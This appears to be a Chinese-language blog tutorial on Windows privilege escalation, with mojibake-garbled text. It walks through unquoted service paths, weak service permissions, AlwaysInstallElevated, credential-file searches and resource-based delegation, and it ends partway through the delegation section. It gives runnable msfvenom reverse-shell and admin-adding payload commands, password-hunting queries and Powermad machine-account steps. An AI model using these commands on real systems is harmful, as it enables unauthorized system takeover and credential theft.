<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Windowsææƒ - ConsT27's Blog</title>
    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Windows\u63d0\u6743", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "\u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84 \uff08 Trusted Service Paths \uff09", url: "#trusted-service-paths" },
              {title: "\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\uff08Vulnerable Services \uff09", url: "#vulnerable-services" },
              {title: "AlwaysInstallElevated", url: "#alwaysinstallelevated" },
              {title: "\u4fe1\u606f\u6cc4\u9732", url: "#_2" },
              {title: "\u57fa\u4e8e\u8d44\u6e90\u7684\u57df\u59d4\u6d3e\u653b\u51fb", url: "#_3" },
              {title: "POTATO \u5bb6\u65cf", url: "#potato" },
              {title: "MYSQL\u4e0b\u7684\u63d0\u6743\u6280\u672f", url: "#mysql" },
              {title: "\u547d\u540d\u7ba1\u9053\u63d0\u6743", url: "#_9" },
              {title: "\u4ee4\u724c\u7a83\u53d6", url: "#_10" },
          ]},
        ];

    </script>
    <script src="../../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-link">
        æ–°é¡µé¢
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-link">
        Windowsä¸‹å¯ææƒçš„ä¹ç§æƒé™
      </a>
    </div>
    
  </div>

    

    <h1 id="windows">Windowsææƒ</h1>
<h2 id="_1">ç›®å½•</h2>
<ul>
<li><a href="#æ— å¼•å·æœåŠ¡è·¯å¾„--Trusted-Service-Paths-">æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ Trusted Service Paths ï¼‰</a></li>
<li><a href="#æ˜“å—æ”»å‡»çš„æœåŠ¡Vulnerable-Services-">æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆVulnerable Services ï¼‰</a></li>
<li><a href="#AlwaysInstallElevated">AlwaysInstallElevated</a></li>
<li><a href="#ä¿¡æ¯æ³„éœ²">ä¿¡æ¯æ³„éœ²</a></li>
<li><a href="#åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»">åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»</a><ul>
<li><a href="#åŸç†çš„å‡ ä¸ªç‚¹">åŸç†çš„å‡ ä¸ªç‚¹ï¼š</a></li>
<li><a href="#æ”»å‡»æµç¨‹">æ”»å‡»æµç¨‹:</a></li>
<li><a href="#å®æ“">å®æ“</a></li>
<li><a href="#æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡">æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡</a></li>
</ul>
</li>
<li><a href="#POTATO-å®¶æ—">POTATO å®¶æ—</a><ul>
<li><a href="#hot-potato">hot potato</a></li>
</ul>
</li>
<li><a href="#MYSQLä¸‹çš„ææƒæŠ€æœ¯">MYSQLä¸‹çš„ææƒæŠ€æœ¯</a><ul>
<li><a href="#MOFææƒ">MOFææƒ</a></li>
<li><a href="#UDFææƒ">UDFææƒ</a></li>
<li><a href="#å¯åŠ¨é¡¹ææƒ">å¯åŠ¨é¡¹ææƒ</a></li>
</ul>
</li>
<li><a href="#å‘½åç®¡é“ææƒ">å‘½åç®¡é“ææƒ</a></li>
<li><a href="#ä»¤ç‰Œçªƒå–">ä»¤ç‰Œçªƒå–</a></li>
</ul>
<hr />
<hr />
<h2 id="trusted-service-paths">æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ <strong>Trusted Service Paths</strong> ï¼‰</h2>
<p>å…ˆè¯´å®ç”¨åº¦ï¼Œæ¯”è¾ƒè¢«åŠ¨ï¼Œè€Œä¸”æ¯”è¾ƒçœ‹è„¸ã€‚</p>
<p>Windowsä¸‹æœåŠ¡çš„æƒé™é€šå¸¸æ˜¯SYSTEMã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ›¿æ¢æœåŠ¡çš„å¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼ˆå¦‚åå¼¹shellï¼‰ï¼Œå³ç›¸å½“äºè·å¾—äº†SYSTEMæƒé™ï¼Œè¾¾åˆ°äº†ææƒçš„ç›®çš„ã€‚
æ— å¼•å·æœåŠ¡è·¯å¾„æœ‰å¯èƒ½ä¼šå¯¼è‡´è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚
æ‰€è°“æ— å¼•å·æœåŠ¡è·¯å¾„ï¼Œå°±æ˜¯æœåŠ¡å¯åŠ¨ç¨‹åºçš„è·¯å¾„ä¸­åŒ…å«äº†ç©ºæ ¼ä¸”æœªè¢«å¼•å·åŒ…å«èµ·æ¥ã€‚æ¯”å¦‚è¿™æ ·</p>
<pre><code class="language-çº¯æ–‡æœ¬">C:\Program Files\floder1\service.exe
</code></pre>
<p>å› ä¸ºç©ºæ ¼çš„å­˜åœ¨ï¼ŒWindowsåœ¨å¯åŠ¨æœåŠ¡æ‰¾å¯»æœåŠ¡å¯åŠ¨é¡¹æ—¶ï¼Œå®ƒä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºè¿›è¡Œå¯åŠ¨é¡¹å¯»æ‰¾</p>
<pre><code class="language-çº¯æ–‡æœ¬">C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
</code></pre>
<p>è¿™å°±ç»™äº†æˆ‘ä»¬æœ‰æœºå¯ä¹˜çš„æœºä¼šï¼šå¦‚æœæˆ‘ä»¬åœ¨æœåŠ¡çš„ä¸Šå±‚ç›®å½•æœ‰å†™å…¥æˆ–å®Œå…¨æ§åˆ¶æƒé™ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å°†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨Windowsæœå¯»æœåŠ¡å¯åŠ¨é¡¹çš„æ›´é å‰é¡ºåºä¸Šã€‚</p>
<p><img alt="QQæˆªå›¾20210217143921" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217143921.png" title="QQæˆªå›¾20210217143921" /></p>
<p>æˆ‘ä»¬ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æœç´¢å“ªäº›æœåŠ¡è·¯å¾„æ²¡æœ‰åŒ…å«å¼•å·</p>
<pre><code class="language-çº¯æ–‡æœ¬">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
</code></pre>
<p>æ‰¾åˆ°ä¸€ä¸ªã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çš„æ€è·¯å¯èƒ½å°±æ˜¯åœ¨2345Explorerç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªProtect.exeäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦çœ‹çœ‹2345Explorerç›®å½•æˆ‘ä»¬çš„æƒé™å¦‚ä½•ã€‚</p>
<p>å…ˆæ¥ä¸€æ‰‹whoami /all.å‘ç°è‡ªå·±æ˜¯Usersç»„çš„ã€‚</p>
<p><img alt="QQæˆªå›¾20210217143934" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217143934.png" title="QQæˆªå›¾20210217143934" /></p>
<p>ç„¶åä½¿ç”¨icaclså‘½ä»¤æŸ¥çœ‹åœ¨2345Explorerç›®å½•çš„æƒé™å¦‚ä½•</p>
<p><img alt="QQæˆªå›¾20210217143945" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217143945.png" title="QQæˆªå›¾20210217143945" /></p>
<p>usersç»„æ˜¯å®Œå…¨æ§åˆ¶æƒï¼ˆFï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ç”¨msfvenomæ„é€ ä¸€ä¸ªåå¼¹shellçš„exeã€‚å‘½åä¸ºProtect.exeï¼Œæ”¾å…¥2345Explorerç›®å½•ã€‚æˆ‘è¿™é‡Œéšä¾¿ç¼–ç äº†ä¸€ä¸‹</p>
<pre><code class="language-çº¯æ–‡æœ¬"> msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai LHOST=192.168.111.129 LPORT=10068 -f exe -o Protect.exe
</code></pre>
<p><img alt="QQæˆªå›¾20210217144053" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144053.png" title="QQæˆªå›¾20210217144053" /></p>
<p>ç„¶åæˆ‘ä»¬ç°åœ¨æ˜¯æ²¡æœ‰èƒ½åŠ›é‡å¯æœåŠ¡çš„ã€‚ã€‚åªèƒ½ç­‰ç®¡ç†å‘˜é‡å¯æœåŠ¡æˆ–è€…æœºå­é‡å¯ã€‚ç„¶åå°±æ‹¿åˆ°SYSTEMæƒé™äº†ã€‚ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œè¿™ä¸ªå‘ç‚¹æ˜¯å¦‚æœä¸€ä¸ªæœåŠ¡å¯åŠ¨ååœ¨ä¸€å®šæ—¶é—´å†…æœªä¸ Service Control Manager(SCM) é€šè®¯ï¼Œå°±ä¼šè¢«åœæ­¢ã€‚</p>
<p><img alt="QQæˆªå›¾20210217144102" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144102.png" title="QQæˆªå›¾20210217144102" /></p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦åœ¨æ‹¿åˆ°shellååŠæ—¶çš„è½¬ç§»è¿›ç¨‹æˆ–è€…æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·ã€‚
è½¬ç§»è¿›ç¨‹åœ¨msfä¸­å¾ˆç®€å•ï¼Œmeterpreterä¸­å…ˆç”¨psæŸ¥çœ‹è¿›ç¨‹ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªsystemæƒé™ï¼Œè®°ä½å…¶pidï¼Œç„¶å migrate PID å³å¯å®Œæˆè¿›ç¨‹è¿ç§»ã€‚</p>
<p>ä¸‹é¢æ¥è¯´è¯´é˜²æ²»æ–¹æ³•å§ã€‚è¿›å…¥æ³¨å†Œè¡¨ä¿®æ”¹çª—å£ï¼Œåœ¨ HKEY_LOCAL_MACHINE &gt;&gt; SYSTEM &gt;&gt; CurrentControlSet &gt;&gt; Services è·¯å¾„ä¸‹æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„æœåŠ¡ï¼Œä¿®æ”¹å…¶ImagePathï¼ŒæŠŠè·¯å¾„å‰ååŠ ä¸ªå¼•å·å°±å¯äº†ã€‚</p>
<h2 id="vulnerable-services">æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆ<strong>Vulnerable Services</strong> ï¼‰</h2>
<p>åŒæ ·çœ‹è„¸ä¸”è¢«åŠ¨</p>
<p>è¿™ä¸ªæ”»å‡»æ–¹æ³•å¤§è‡´åˆ†ä¸¤ç±»
1.æ›¿æ¢æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿™ä¸ªæ–¹æ³•è¾ƒä¸ºç®€å•ï¼Œå¦‚æœå¯¹æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨ç›®å½•æœ‰ä¿®æ”¹æƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„ç¨‹åºæ¥æ›¿æ¢åŸæœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶æœåŠ¡ã€‚è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œè€Œä¸”åŸºæœ¬ä¸Šæ”»å‡»æµç¨‹å’Œ<strong>Trusted Service Paths</strong>å¦‚å‡ºä¸€è¾™ï¼ŒåŒæ ·ä¹Ÿæ˜¯æ¯”è¾ƒè¢«åŠ¨åœ°ç­‰å¾…é‡å¯æœåŠ¡æ‰èƒ½å¼¹shellï¼Œå°±ä¸å†æ¼”ç¤ºäº†ã€‚
2.ä¿®æ”¹æœåŠ¡çš„å±æ€§ã€‚å¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹æœåŠ¡çš„ <strong>BINARY_PATH_NAME</strong> å±æ€§ï¼ˆè¿™ä¸ªå±æ€§ç”¨äºæŒ‡å‘æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¾ç½® <strong>BINARY_PATH_NAME</strong> çš„å€¼ä¸ºç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åé‡å¯æœåŠ¡æ—¶æˆ‘ä»¬çš„ç³»ç»Ÿå‘½ä»¤ä¼šè¢«æ‰§è¡Œã€‚</p>
<p>å¯¹äºåè€…ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¬¾å·¥å…·æ¥å¿«é€Ÿæ­ç¤ºå‡ºæˆ‘ä»¬èƒ½ä¿®æ”¹å“ªäº›æœåŠ¡çš„å±æ€§ã€‚
è¿™ä¸ªå·¥å…·æˆ‘ä»¬é‡‡ç”¨accesschk.exeï¼Œå®ƒæ˜¯å¾®è½¯äº§å‡ºçš„ï¼ŒåŸºæœ¬ä¸ä¼šæŠ¥æ¯’ã€‚</p>
<p>æˆ‘ä»¬é€šè¿‡è¯¥å·¥å…·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<pre><code class="language-çº¯æ–‡æœ¬">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula
or
accesschk.exe -uwcqv &quot;Users&quot; * /accepteula
æ¥æŸ¥çœ‹Usersç»„ï¼ˆæ ¹æ®å®é™…æƒ…å†µæ¥å¡«å“ªä¸ªç»„ï¼‰å¯¹å“ªäº›æœåŠ¡æœ‰å“ªäº›æƒé™
</code></pre>
<p>å¦‚æœå¯¹æŸä¸ªæœåŠ¡æœ‰service_all_accessæˆ–è€…ä»¥ä¸‹æƒé™ï¼Œå°±è¯´æ˜èƒ½å¯¹å…¶å±æ€§è¿›è¡Œä¿®æ”¹ã€‚</p>
<p><img alt="QQæˆªå›¾20210217144124" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144124.png" title="QQæˆªå›¾20210217144124" /></p>
<p>æ¯”å¦‚æˆ‘ä»¬å¯¹SpooleræœåŠ¡æœ‰service_all_accessæƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿™æ ·åšã€‚
é€šè¿‡ä¿®æ”¹å…¶binPathä¸ºæ¶æ„æŒ‡ä»¤ï¼Œç„¶åç­‰å¾…ç®¡ç†å‘˜é‡å¯æœåŠ¡ï¼Œæˆ‘ä»¬çš„æ¶æ„æŒ‡ä»¤å°±ä¼šè¢«æ‰§è¡Œã€‚</p>
<p><img alt="QQæˆªå›¾20210217144141" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144141.png" title="QQæˆªå›¾20210217144141" /></p>
<h2 id="alwaysinstallelevated"><strong>AlwaysInstallElevated</strong></h2>
<p>å¦‚æœwindowså¯ç”¨äº†å¦‚ä¸‹æ³¨å†Œè¡¨é¡¹</p>
<pre><code class="language-çº¯æ–‡æœ¬">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
â€œAlwaysInstallElevatedâ€=dword:00000001 

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
â€œAlwaysInstallElevatedâ€=dword:00000001
</code></pre>
<p>é‚£ä¹ˆæ‰€æœ‰msiï¼ˆwindowsåº”ç”¨å®‰è£…ç¨‹åºï¼‰éƒ½ä¼šä»¥SYSTEMæƒé™è¿è¡Œã€‚æ­¤æ—¶å¦‚æœæˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªæ¶æ„msiç¨‹åºï¼Œå³å¯è¾¾åˆ°ææƒç›®çš„
åŒæ—¶éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™ä¸ªæ³¨å†Œè¡¨é¡¹ä¸ä¸€å®šæ€»æ˜¯å­˜åœ¨çš„ã€‚ï¼ˆæ¯”å¦‚æˆ‘çš„å®éªŒæœº</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡reg queryæ¥éªŒè¯è¿™ä¸¤æ¡æ³¨å†Œè¡¨é¡¹çš„æƒ…å†µ</p>
<pre><code class="language-çº¯æ–‡æœ¬">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre>
<p>è‹¥å‡ä¸º1ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆæ¶æ„msiæ¥ææƒ</p>
<pre><code class="language-çº¯æ–‡æœ¬">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
</code></pre>
<p>ç„¶åæ‰§è¡Œï¼Œè·å¾—ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ã€‚</p>
<h2 id="_2">ä¿¡æ¯æ³„éœ²</h2>
<p><em>Unattend.xml</em> <em>sysprep.xmlå’Œsysprep.infæ–‡ä»¶</em><code>GPP.xml</code> å­˜åœ¨ç€ä¸€å®šä¿¡æ¯æ³„éœ²ï¼Œä»–ä»¬é€šå¸¸å­˜åœ¨äºä»¥ä¸‹è·¯å¾„</p>
<pre><code class="language-çº¯æ–‡æœ¬">C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
</code></pre>
<p>æ‰¾åˆ°åï¼Œæ‰¾åˆ° <em>Unattend.xml</em> æ–‡ä»¶ä¸­çš„  æ ‡ç­¾ã€‚å°±æœ‰å¯èƒ½æ‰¾åˆ°ç”¨æˆ·çš„åŠ å¯†åçš„å¯†ç ã€‚ã€‚</p>
<pre><code class="language-çº¯æ–‡æœ¬">&lt;UserAccounts&gt;
    &lt;LocalAccounts&gt;
        &lt;LocalAccount&gt;
            &lt;Password&gt;
                &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ=&lt;/Value&gt; //PASSWORD
                &lt;PlainText&gt;false&lt;/PlainText&gt;
            &lt;/Password&gt;
            &lt;Description&gt;Local Administrator&lt;/Description&gt;
            &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;
            &lt;Group&gt;Administrators&lt;/Group&gt;
            &lt;Name&gt;Administrator&lt;/Name&gt;
        &lt;/LocalAccount&gt;
    &lt;/LocalAccounts&gt;
&lt;/UserAccounts&gt;
ä¸€äº›æ•æ„Ÿæ–‡ä»¶æŸ¥è¯¢æŒ‡ä»¤
C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr \*password\*
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre>
<h2 id="_3">åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»</h2>
<p>refer:<a href="https://xz.aliyun.com/t/7454" title="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p>
<h4 id="_4">åŸç†çš„å‡ ä¸ªç‚¹ï¼š</h4>
<p>1.S4U2SELF åè®®å¯ä»¥åœ¨ç”¨æˆ·æ²¡æœ‰é…ç½® TrustedToAuthenticationForDelegation å±æ€§ï¼ˆå³å¼€å¯ä½¿ç”¨ä»»ä½•åè®®è®¤è¯çš„çº¦æŸæ€§å§”æ´¾ï¼‰æ—¶è¢«è°ƒç”¨ï¼Œä½†æ˜¯è¿”å›çš„STæ˜¯ä¸å¯è¢«è½¬å‘çš„ã€‚
2.åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä¸»æœº åœ¨è¢«å¦ä¸€å°ä¸»æœºå§”æ´¾è®¿é—®æ—¶ï¼Œåœ¨S4U2PROXYè¿‡ç¨‹ä¸­æäº¤è¿‡æ¥çš„STå¦‚æœå³ä½¿æ˜¯ä¸å¯è½¬å‘çš„ã€‚KDCä¾æ—§ä¼šè¿”å›æœ‰æ•ˆçš„ST2ã€‚
3.æ¯ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤å¯ä»¥åˆ›å»ºè‡³å¤šåä¸ªæœºå™¨è´¦æˆ·ï¼ˆ ç”±MachineAccountQuotaå±æ€§å†³å®š ï¼‰ï¼Œæ¯ä¸ªæœºå™¨è´¦æˆ·è¢«åˆ›å»ºæ—¶éƒ½ä¼šè‡ªåŠ¨æ³¨å†ŒSPN: <code>RestrictedKrbHost/domain</code>å’Œ<code>HOST/domain</code>è¿™ä¸¤ä¸ªSPN</p>
<h4 id="_5">æ”»å‡»æµç¨‹:</h4>
<p>å‡è®¾å¼€å¯åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æœºå™¨ä¸ºA
1.é¦–å…ˆè¦æœ‰ä¸€ä¸ªå¯¹å½“å‰è®¡ç®—æœºæœ‰å†™æƒé™çš„è´¦æˆ·ï¼Œæ‰èƒ½å¯¹Aè®¾ç½®å¯ä»¥ è¢« å§”æ´¾è®¿é—®çš„æœåŠ¡è´¦æˆ·ã€‚
2.åˆ©ç”¨å½“å‰è´¦æˆ·åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶é…ç½®å¥½æœºå™¨è´¦æˆ·åˆ°Açš„ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾
3.å› ä¸ºæœºå™¨è´¦æˆ·æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„å¯†ç è´¦æˆ·ï¼Œå¯ä»¥è®©å®ƒåˆ©ç”¨S4U2SELFåè®®è·å¾—ä¸€ä¸ªä¸å¯è½¬å‘STã€‚ç„¶åç”¨è¿™ä¸ªä¸å¯è½¬å‘STé€šè¿‡S4U2PROXYï¼Œåœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åŸºç¡€ä¸Šè·å¾—æœ‰æ•ˆçš„è®¿é—®A cifsæœåŠ¡çš„ST2ã€‚
4.ç”¨ST2è®¿é—®Açš„CIFSæœåŠ¡ï¼Œæƒé™è·å¾—ã€‚</p>
<h4 id="_6">å®æ“</h4>
<p>è¿™ä¸ªæ”»å‡»è¯´ç™½äº†å°±æ˜¯ä¸ªææƒ...</p>
<p>é¦–å…ˆæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åŸŸæ§æ˜¯å¦æ˜¯win2012ä»¥ä¸Šçš„ä¸»æœºï¼Œå› ä¸ºåªæœ‰è¿™æ ·æ‰èƒ½å¼€å¯ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨powersploitä¸‹çš„powerviewè„šæœ¬ã€‚æ‰§è¡Œå‘½ä»¤ get-netdomaincontroller</p>
<p><img alt="QQæˆªå›¾20210217135833" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217135833.png" title="QQæˆªå›¾20210217135833" /></p>
<p>å¯ä»¥è·å¾—åŸŸæ§WINç‰ˆæœ¬</p>
<p>ç„¶åæˆ‘ä»¬æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹å“ªå°ä¸»æœºæœ‰å†™æƒé™ã€‚å› ä¸ºæ˜¯å®éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ€ä¹ˆé…ç½®ä¸€ä¸ªç”¨æˆ·å¯¹ä¸€ä¸ªæœºå™¨çš„æƒé™ã€‚
ç›´æ¥åœ¨åŸŸæ§ä¸Šæ‰¾åˆ°æŸä¸»æœºï¼Œç„¶åè¿›å…¥åœ¨å±æ€§é‡Œè¿›å…¥å®‰å…¨é€‰é¡¹å¡ï¼Œæ·»åŠ æŸç”¨æˆ·ï¼Œç„¶åç»™è¿™ä¸ªç”¨æˆ·åˆ†é…æƒé™å³å¯ã€‚</p>
<p><img alt="QQæˆªå›¾20210217135859" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217135859.png" title="QQæˆªå›¾20210217135859" /></p>
<p>æˆ‘ä»¬ä¾æ—§ä½¿ç”¨powerviewã€‚å…ˆè°ƒç”¨
<code>Get-DomainUser -Identity username -Properties objectsid</code>æ¥è·å–å½“å‰ç”¨æˆ·SID
ç„¶å<code>Get-DomainObjectAcl -Identity ä¸»æœºå | ?{$_.SecurityIdentifier -match "åˆšåˆšå¾—åˆ°çš„SID"}</code> æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹æŸå°ä¸»æœºæ˜¯å¦æœ‰å†™æƒé™ã€‚</p>
<p><img alt="QQæˆªå›¾20210217140628" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217140628.png" title="QQæˆªå›¾20210217140628" /></p>
<p>å¦‚æœæœ‰ GenericAllï¼ˆå®Œå…¨æ§åˆ¶æƒï¼‰ï¼ŒGenericWriteã€WritePropertyã€WriteDacl è¿™äº›å±æ€§ï¼Œå°±è¯´æ˜è¯¥ç”¨æˆ·èƒ½ä¿®æ”¹è®¡ç®—æœºçš„è´¦æˆ·å±æ€§ã€‚
å¦‚å›¾çœ‹åˆ°æˆ‘ä»¬å¯¹WIN7è¿›è¡Œæ“ä½œ</p>
<p>å¥½çš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦åˆ›ç«‹ä¸€ä¸ªæœºå™¨ç”¨æˆ·äº†ã€‚æ ¹æ®ç½‘ä¸Šæœç´¢ç»“æœï¼Œä½¿ç”¨powermadè¿™ä¸ªpsè„šæœ¬å¯ä»¥å¾ˆå¿«æ·çš„åˆ›å»ºä¸€ä¸ªæœºå™¨ç”¨æˆ·ã€‚<a href="https://github.com/Kevin-Robertson/Powermad" title="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
<pre><code class="language-çº¯æ–‡æœ¬">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)
</code></pre>
<p><img alt="QQæˆªå›¾20210217140659" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217140659.png" title="QQæˆªå›¾20210217140659" /></p>
<p>å¥½çš„ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¯†ç hackï¼Œåä¸ºhacksystemçš„æœºå™¨è´¦æˆ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é…ç½®hacksystemåˆ°WIN7çš„å§”æ´¾äº†ã€‚æˆ‘ä»¬éœ€è¦åšçš„ï¼Œæ˜¯ä¿®æ”¹WIN7çš„ <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§çš„å€¼ ï¼Œè¿™ä¸ªæ“ä½œæˆ‘ä»¬ç”¨powerviewå®ç°ã€‚</p>
